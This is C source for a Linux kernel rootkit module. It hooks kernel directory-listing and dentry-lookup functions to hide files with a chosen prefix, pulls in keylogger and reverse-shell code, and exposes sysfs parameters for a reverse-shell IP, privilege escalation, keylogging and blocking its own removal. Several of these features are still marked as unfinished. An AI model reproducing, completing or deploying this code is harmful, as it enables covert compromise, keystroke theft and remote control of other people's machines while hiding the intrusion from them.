/**
 * @file    rootkit.c
 * @author  Aaron Lichtman, Arch Gupta
 * @brief   A rootkit. TODO: Expand description
 */
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/jiffies.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/timer.h>
#include "arsenal/keylogger.c"
#include "arsenal/reverse-shell.c"
#include "khook/engine.c"

MODULE_AUTHOR("Aaron Lichtman");
MODULE_AUTHOR("Arch Gupta");
MODULE_DESCRIPTION("Linux rootkit.");
MODULE_VERSION("0.1");
MODULE_LICENSE("GPL");  // So the kernel doesn't complain about proprietary code

/**
 * Data structures
 */

#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
typedef struct legacy_timer_emu {
    struct timer_list t;
    void (*function)(unsigned long);
    unsigned long data;
} _timer;
#else
typedef struct timer_list _timer;
#endif

typedef struct commands {
    // TODO: Add properties for each of the commands we can accept
    char *rev_shell_ip;
    // TODO: Add toggle for enabling and disabling hidden files.
    bool escalate_privs;
    bool keylogger;
} commands;

/**
 * Global defines and variables.
 */

#define POLLING_INTERVAL 1500
static _timer polling_timer;
struct commands cmds;

/**
 * Module parameters are made writable by anyone.
 * Any interaction with the rootkit will be through a command like:
 * $ echo "1" > /sys/module/garden/parameters/get_root. This will
 * update the value of the get_root parameter. We can poll this value
 * intermittently and do things when it changes.
 **/

static bool block_removal = false;
module_param(block_removal, bool, 0770);
MODULE_PARM_DESC(block_removal, "Toggle for blocking removal of rootkit.");
static char *rev_shell_ip = NULL;
module_param(rev_shell_ip, charp, 0770);
MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
static char *hidden_file_prefix = NULL;
module_param(hidden_file_prefix, charp, 0770);
MODULE_PARM_DESC(hidden_file_prefix, "Prefix for hidden files.");
static bool escalate_privileges = false;
module_param(escalate_privileges, bool, 0770);
MODULE_PARM_DESC(escalate_privileges, "Toggle for escalating current user to root.");
static bool keylogger = false;
module_param(keylogger, bool, 0770);
MODULE_PARM_DESC(keylogger, "Toggle for keylogger.");

/**
 * Forward declarations
 */

static void poll_for_commands(unsigned long data);

/**
 * Logging Helpers
 * // TODO: Fix
 */

void log_info(const char *message) {
    printk(KERN_EMERG "GARDEN: %s", message);
}

void log_error(const char *message) {
    printk(KERN_ERR "GARDEN: %s", message);
}

/**
 * Hide files and directories.
 * Adapted from: https://github.com/f0rb1dd3n/Reptile/blob/0e562cffc4373d6774502a2f68fd758f58a2db75/rep_mod.c#L619
 */

/**
 * If this method returns true, the file in question should be hidden.
 */
static bool should_hide_file(const char *name) {
    printk(KERN_EMERG "Determining if should hide: %s\n", name);
    if (hidden_file_prefix && !strncmp(name, hidden_file_prefix, strlen(hidden_file_prefix))) {
        return true;
    }
    return false;
}

KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
    if (should_hide_file(name)) {
        return 0;
    }
    return KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
}

KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
    if (should_hide_file(name)) {
        return 0;
    }
    return KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
}

KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir64(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
    if (should_hide_file(name)) {
        return 0;
    }
    return KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
}

KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
    if (should_hide_file(name)) {
        return 0;
    }
    return KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
}

KHOOK_EXT(int, compat_filldir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
    if (should_hide_file(name)) {
        return 0;
    }
    return KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
}

KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name) {
    if (should_hide_file(name->name)) {
        return NULL;
    }
    return KHOOK_ORIGIN(__d_lookup, parent, name);
}

/**
 * Timer and Command Polling Functions
 * Adapted from: https://github.com/aircrack-ng/rtl8812au/commit/f221a169f281dab9756a176ec2abd91e0eba7d19
 */

#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
static void legacy_timer_function_wrapper(struct timer_list *timer) {
    struct legacy_timer_emu *legacy_timer = from_timer(legacy_timer, timer, t);
    // NOTE: legacy_timer->data is currently always NULL, but may not be in the future.
    legacy_timer->function(legacy_timer->data);
}
#endif

__inline void timer_init_wrapper(_timer *timer, void *func) {
    timer->data = 0;
    timer->function = func;
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
    timer_setup(&timer->t, legacy_timer_function_wrapper, 0);
#else
    init_timer(timer);
#endif
}

__inline static void set_timer(_timer *timer) {
    unsigned long expires = jiffies + msecs_to_jiffies(POLLING_INTERVAL);
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
    mod_timer(&timer->t, expires);
#else
    mod_timer(timer, expires);
#endif
    // printk("Timer configured to go off at %lu jiffies, in %lu msecs\n", expires, msecs_to_jiffies(POLLING_INTERVAL));
}

__inline static void timer_cleanup_wrapper(_timer *timer) {
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
    del_timer_sync(&timer->t);
#else
    del_timer_sync(timer);
#endif
}

/**
 * Check all parameters against last-known values and see if anything changed.
 * If yes, take the requested action.
 * Finally, start a timer to call this function again in the future.
 * NOTE: The data parameter is required in order for this to compile.
 */
static void poll_for_commands(unsigned long data) {
    // TODO: Store previous values of variables somewhere.
    log_info("Polling for commands!\n");
	printk(KERN_EMERG "rev_shell_ip: %s", rev_shell_ip);
	printk(KERN_EMERG "hidden_file_prefix: %s", hidden_file_prefix);
	printk(KERN_EMERG "block_removal: %d", block_removal);
	printk(KERN_EMERG "keylogger enabled: %d", keylogger);

    if (rev_shell_ip != cmds.rev_shell_ip) {
        printk(KERN_EMERG "rev_shell_ip updated: %s\n", rev_shell_ip);
        cmds.rev_shell_ip = rev_shell_ip;
        // TODO: Set up reverse shell.
    }

    // TODO: Check for change in hidden file hiding
    // TODO: Check for keylogger enabling
    // TODO: Check for escalating to root privs.
    set_timer(&polling_timer);
}

static void copy_params_into_cmd_struct(commands *cmd) {
    cmd->rev_shell_ip = rev_shell_ip;
    cmd->escalate_privs = escalate_privileges;
    cmd->keylogger = keylogger;
}

/**
 * Rootkit module initialization.
 */
static int __init rootkit_init(void) {
    printk(KERN_EMERG "Initializing rootkit...\n");
    khook_init();

    printk(KERN_EMERG "Reading parameters...\n");
    copy_params_into_cmd_struct(&cmds);

    printk(KERN_EMERG "Initializing timer...\n");
    timer_init_wrapper(&polling_timer, poll_for_commands);
    set_timer(&polling_timer);

    // Gotta make the compiler happy.
    poll_for_commands(0);
    return 0;
}

/**
 * Called when $ rmmod is executed. If block_removal is toggled on, this
 * function stops the rootkit from being removed. If it is not enabled,
 * the rootkit is cleaned up nicely.
 */
static void __exit rootkit_exit(void) {
	printk(KERN_EMERG "rmmod called. Cleaning up rootkit.");
	if (block_removal) {
		printk(KERN_EMERG "Just kidding. This sounds like a good time to reinstall your OS.");
		rootkit_init();
	} else {
		khook_cleanup();
		timer_cleanup_wrapper(&polling_timer);
	}

}

module_init(rootkit_init);
module_exit(rootkit_exit);
